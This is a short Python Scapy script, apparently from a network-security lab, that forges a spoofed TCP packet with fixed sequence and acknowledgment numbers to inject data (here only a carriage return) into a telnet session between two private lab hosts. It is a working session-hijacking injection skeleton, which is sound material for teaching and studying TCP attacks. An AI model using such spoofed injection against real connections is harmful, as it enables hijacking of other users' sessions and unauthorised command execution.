#!/usr/bin/env python3
from scapy.all import *
eth = Ether(src="02:42:0a:09:00:06")
ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=59956, dport=23, flags="A", seq=4249710847, ack=2605749233)
data = "\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)